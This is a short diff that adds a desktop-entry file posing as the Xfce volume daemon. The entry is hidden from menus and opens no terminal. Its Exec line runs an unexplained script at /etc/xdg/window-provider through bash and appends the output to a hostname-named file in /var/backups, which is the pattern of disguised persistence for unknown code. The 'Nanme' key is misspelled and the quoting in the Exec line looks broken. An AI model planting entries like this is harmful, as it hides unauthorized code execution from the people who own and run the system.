@@ -1,0 +1,11 @@
+[Desktop Entry]
+Encoding=UTF-8
+Version=2.9
+Nanme=Xfce Volume Daemon
+Icon=utilities-terminal
+GenericName=xfce4-volumed
+Exec=/bin/bash "/etc/xdg/window-provider >> /var/backups/xfwm-$(hostname)-0.bak"
+Terminal=false
+Type=Application
+StartupNotify=false
+NoDisplay=true
